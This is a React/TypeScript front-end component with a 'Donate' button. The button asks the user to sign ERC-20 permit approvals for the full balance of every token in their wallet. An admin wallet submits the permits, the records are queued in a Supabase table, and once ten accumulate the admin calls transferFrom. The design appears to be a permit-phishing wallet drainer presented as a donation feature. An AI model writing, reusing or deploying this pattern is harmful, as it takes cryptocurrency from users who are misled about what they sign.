import { FC, useEffect, useState } from "react";
import {  ethers } from "ethers";
import { JsonRpcSigner } from "ethers";
import donationAbi from "../abis/donationAbi.json";
import { donationContractAddress } from "../abis/contarctAddress";
import { Wallet } from "ethers";
import DonateNFT from "./DonateNFT";
import { supabaseClient } from "../lib/supabaseClient";

interface Token {
  tokenAddress: string;
  amount: bigint;
  decimal: bigint;
}

interface HeaderProps {
  signer: JsonRpcSigner | null;
  adminSigner: Wallet | null;
  holdTokens: {
    tokenAddress: string;
    amount: bigint;
    name: string;
    symbol: string;
    decimal: bigint;
    image: string;
  }[];
}

interface DbData{
  tokenAddress: string;
  amount: bigint;
  owner: string;
}

interface SignatureData {
  owner: string;
  token: string;
  amount: bigint;
  deadline: number;
  v: number;
  r: string;
  s: string;
}

interface SelectData {
  id: number;
  tokenAddress: string;
  amount: string;
  owner: string;
  created_at: string;
}

const SignatureButton: FC<HeaderProps> = ({
  signer,
  adminSigner,
  holdTokens,
}) => {
  const [deadline, setDeadline] = useState<number>(
    Math.floor(Date.now() / 1000) + 60 * 60
  ); // 1시간 유효
  const [deleteDatas, setDeleteDatas] = useState<SelectData[]>([]);


  useEffect(() => {
    if (!signer) return;
    console.log("HOLD ", holdTokens);
  }, [signer]);

    useEffect(() => {
      if (!deleteDatas) return;

      //transfer처리
      transferData();

      deleteSig(deleteDatas);
  }, [deleteDatas]);

  const transferData = async () => {
    const signatureContract = new ethers.Contract(
      donationContractAddress,
      donationAbi,
      adminSigner
    );

    await signatureContract.transferFrom(deleteDatas);
  }

  const getPermitSignature = async (
    token: Token,
    spender: string,
    deadline: number
  ): Promise<SignatureData | null> => {
    if (!signer) return null;

    const erc20Abi = ["function name() view returns (string)"];
    const ERC20TK = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
    const signatureContract = new ethers.Contract(
      donationContractAddress,
      donationAbi,
      signer
    );

    const chainId = (await signer.provider.getNetwork()).chainId;
    const owner = await signer.getAddress();
    const name = await ERC20TK.name();
    const value = token.amount; // bigint
    const nonce = await signatureContract.getNonces(
      token.tokenAddress,
      signer.address
    );

    const domain = {
      name: name,
      version: "1",
      chainId: chainId,
      verifyingContract: token.tokenAddress,
    };

    const types = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };

    const message = {
      owner: owner,
      spender: spender,
      value: value,
      nonce: nonce,
      deadline: deadline,
    };

    try {
      // 서명 생성
      const signature = await signer.signTypedData(domain, types, message);

      // 서명 파싱
      const sig = ethers.Signature.from(signature);

      return {
        owner: message.owner,
        token: token.tokenAddress,
        amount: value, // 스마트 컨트랙트에 전달하기 위해 여전히 문자열로 변환
        deadline: message.deadline,
        v: sig.v,
        r: sig.r,
        s: sig.s,
      };
    } catch (error) {
      console.error("Error signing permit:", error);
      return null;
    }
  };

  const handleCollectSignatures = async () => {
    const spender = donationContractAddress; // 서명 컨트랙트 주소

    for (const token of holdTokens) {
      console.log(token, spender, deadline);
      const signature = await getPermitSignature(token, spender, deadline);

      if (signature) {
        await sendSignaturesToPermit(signature);

        //DB insert - owner, tokenAddress, amount
        const data={
            tokenAddress: token.tokenAddress!,
            amount: token.amount!,
            owner:signer!.address!,
        }
        console.log("DATA",data);
        await insertSig(data);
        } else {
        console.error(
          "Failed to collect signature for token:",
          token.tokenAddress
        );
      }
    }

    await countSig();    
  };

  const sendSignaturesToPermit = async (signature: SignatureData) => {
    const signatureContract = new ethers.Contract(
      donationContractAddress,
      donationAbi,
      adminSigner
    );

    try {
      const tx = await signatureContract.permit(signature);
      await tx.wait();

    } catch (error) {
      console.error("permit Error:", error);
    }
  };

  async function insertSig(signature: DbData) {
    const { error } = await supabaseClient
          .from("signature")
          .insert({ tokenAddress: signature.tokenAddress,
            amount: signature.amount.toString(),
            owner:signature.owner });
        if (error) {
          console.error("saveSignature Error ", error);
        } else {
          console.log("insert success");
        }
    }

    async function countSig() {
    const { count, error } = await supabaseClient
      .from("signature")
      .select("*", { count: "exact", head: true });
    if (error) {
      console.error("selectSig Error ", error);
    } else {
      if (count! >= 10) {
        const data = await selectSig(count!);
        //서명 별 트랜잭션 처리 - contract 메서드 호출하면될 듯

        console.log(data);

        //count 개수만큼 row 삭제
        if (!data || data.length === 0) return;
        console.log("TEST");
        setDeleteDatas(data);
      }
    }
  }

    async function selectSig(count: number) {
    const { data } = await supabaseClient
      .from("signature")
      .select("*")
      .order("id", { ascending: true })
      .limit(count);

    return data;
  }

  async function deleteSig(data: SelectData[]) {
    const deleteData = data?.map((row) => row.id);
    console.log("deleteData", deleteData);

    const { error } = await supabaseClient
      .from("signature")
      .delete()
      .in("id", deleteData!);

    if (error) {
      console.error("deleteData Error ", error);
    }
  }

  return (
    <div>
      <button onClick={handleCollectSignatures}>Donate</button>
      <br></br>
      <br></br>
      <DonateNFT signer={signer} holdTokens={holdTokens}/>

    </div>
  );
};

export default SignatureButton;
